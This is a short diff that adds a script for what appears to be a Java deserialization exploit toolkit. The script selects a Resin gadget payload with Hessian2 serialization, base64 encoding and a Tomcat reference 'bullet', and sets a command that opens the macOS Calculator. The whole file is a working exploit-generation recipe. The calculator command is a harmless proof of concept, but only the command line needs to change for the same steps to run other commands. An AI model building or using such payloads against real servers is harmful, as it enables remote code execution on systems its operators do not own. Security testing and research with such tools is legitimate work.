@@ -1,0 +1,7 @@
+use payload Resin
+set serializeType hessian2
+set encoder base64
+set output console
+use bullet TomcatRefBullet
+set command "open /System/Applications/Calculator.app"
+run
